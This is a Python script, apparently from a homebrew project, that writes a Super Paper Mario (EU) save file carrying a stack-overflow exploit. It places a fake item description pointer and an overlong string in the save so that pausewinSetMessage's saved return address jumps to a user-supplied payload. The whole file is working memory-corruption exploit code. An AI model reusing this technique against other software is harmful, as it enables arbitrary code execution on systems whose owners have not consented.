from argparse import ArgumentParser
from math import ceil
from typing import Tuple

from common import be32, LoaderType, write_bytes, write_str, write_u16, write_u32

class ItemData:
    """ItemData struct constants"""

    SIZE = 0x2c
    OFFS_DESC_MSG = 0x14

    ARRAY_ADDR = {
        "eu0": 0x803f5f98
    }


class SpmarioGlobals:
    """SpmarioGlobals struct constants"""

    SIZE = 0x1b08

    OFFS_FRAMEBUFFER_WIDTH = 0x18
    OFFS_FRAMEBUFFER_HEIGHT = 0x1A
    OFFS_SAVE_NAME = 0x20
    OFFS_MAP_NAME = 0x44
    OFFS_GSW = 0x544

    ADDR = {
        "eu0": 0x80525550
    }

    def make_default(name: str, map: str) -> bytes:
        spmg = bytearray(SpmarioGlobals.SIZE)

        # Set the default efb width and height, as they can prevent being able to open the item menu
        write_u16(spmg, SpmarioGlobals.OFFS_FRAMEBUFFER_WIDTH, 608)
        write_u16(spmg, SpmarioGlobals.OFFS_FRAMEBUFFER_HEIGHT, 480)

        # Write the new file name
        write_str(spmg, SpmarioGlobals.OFFS_SAVE_NAME, name)

        # Write the map name
        write_str(spmg, SpmarioGlobals.OFFS_MAP_NAME, map)

        return bytes(spmg)


class MarioPouchWork:
    """MarioPouchWork struct constsnts"""

    SIZE = 0x6a0

    OFFS_LEVEL = 0x4
    OFFS_FLIP_TIMER = 0x14
    OFFS_USE_ITEMS = 0x60
    OFFS_SHOP_ITEMS = 0x74
    OFFS_CATCH_CARDS = 0x10c
    OFFS_MINIGAME_SCORES = 0x368

    ADDR = {
        "eu0": 0x80511a28
    }

    def make_default() -> bytes:
        pouch = bytearray(MarioPouchWork.SIZE)

        # Set Mario's level to 1, to prevent leveling up immediately
        write_u32(pouch, MarioPouchWork.OFFS_LEVEL, 1)

        # Set the flip timer to 10 to prevent counting up immediately
        write_u32(pouch, MarioPouchWork.OFFS_FLIP_TIMER, 10)

        return bytes(pouch)


class SaveFile:
    """SaveFile struct constants"""

    SIZE = 0x25b8

    HEADER_SIZE = 0x8
    OFFS_UNK = 0x21b0
    UNK_SIZE = 0x400

    OFFS_POUCH = 0x1b10

    def build(spmg: bytes, pouch: bytes) -> bytes:
        assert len(spmg) == 0x1b08 == SpmarioGlobals.SIZE
        assert len(pouch) == 0x6a0 == MarioPouchWork.SIZE
        header = bytes(SaveFile.HEADER_SIZE)
        unk = bytes(SaveFile.UNK_SIZE)
        main_save = header + spmg + pouch + unk
        checksum = sum(main_save) + (0xff * 4)
        return (
            main_save + be32(checksum) + be32(~checksum & 0xffff_ffff)
        )


class StackFrame:
    """pausewinSetMessage stack frame constants"""

    SIZE = 0xa0
    OFFS_LR_SAVE = SIZE + 4
    OFFS_STR = 0x10


LOADER_TYPE = LoaderType.SAVE
LOADER_VERSION = 1

"""
Save file parts used:
    MarioPouchWork.shopItems: fake descMsg pointer
    MarioPouchWork.catchCards: fake descMsg string
    SpmarioGlobals.gsw[0x400]+: payload
"""


def find_desc_msg_loc(version: str) -> Tuple[int, int]:
    """Finds an item id and offset that can be used for a fake descMsg pointer

    This needs to be a multiple of sizeof(ItemData) away from itemDataTable
    + offsetof(ItemData, descMsg) so that itemDataTable[x].descMsg would read it
    """

    # shopItems has 0x40 safe bytes to use, so an aligned address exists in it
    shop_items_addr = MarioPouchWork.ADDR[version] + MarioPouchWork.OFFS_SHOP_ITEMS

    # Find the first address within shopItems that's aligned to be used
    desc_addr = ItemData.ARRAY_ADDR[version] + ItemData.OFFS_DESC_MSG
    item_id = ceil((shop_items_addr - desc_addr) / ItemData.SIZE)
    addr = desc_addr + item_id * ItemData.SIZE
    pouch_offs = addr - MarioPouchWork.ADDR[version]
    return item_id, pouch_offs


def make_exploit_string(loader_addr: int) -> bytes:
    padding = b"\x11" * (StackFrame.OFFS_LR_SAVE - StackFrame.OFFS_STR)
    return padding + be32(loader_addr) + b"\x00"


def patch_wiimario(spmg: bytes, pouch: bytes, payload: bytes, version: str) -> Tuple[bytes, bytes]:
    spmg = bytearray(spmg)
    pouch = bytearray(pouch)

    # Calculate addresses and offsets
    desc_msg_offs = MarioPouchWork.OFFS_CATCH_CARDS
    desc_msg_addr = MarioPouchWork.ADDR[version] + desc_msg_offs
    item_id, desc_msg_ptr_offs = find_desc_msg_loc(version)
    payload_offs = SpmarioGlobals.OFFS_GSW + 0x400
    payload_addr = SpmarioGlobals.ADDR[version] + payload_offs

    # Write exploit string
    desc_msg = make_exploit_string(payload_addr)
    write_bytes(pouch, desc_msg_offs, desc_msg)

    # Write exploit string pointer
    write_u32(pouch, desc_msg_ptr_offs, desc_msg_addr)

    # Write item id
    write_u16(pouch, MarioPouchWork.OFFS_USE_ITEMS, item_id)

    # Write payload
    write_bytes(spmg, payload_offs, payload)
    
    # TODO: size asserts

    return bytes(spmg), bytes(pouch)

if __name__ == "__main__":
    hex_int = lambda x: int(x, 16)
    parser = ArgumentParser()
    parser.add_argument("payload_path")
    parser.add_argument("save_name")
    parser.add_argument("version")
    parser.add_argument("out_path")
    args = parser.parse_args()

    # Get payload data
    with open(args.payload_path, "rb") as f:
        payload = f.read()

    # Patch header
    # TODO: rework context stuff
    # payload = patch_context(payload, LOADER_TYPE, LOADER_VERSION)

    spmg = SpmarioGlobals.make_default(args.save_name, "dos_01")
    pouch = MarioPouchWork.make_default()
    spmg, pouch = patch_wiimario(spmg, pouch, payload, args.version)
    save = SaveFile.build(spmg, pouch)

    # Output
    with open(args.out_path, "wb") as f:
        f.write(save)
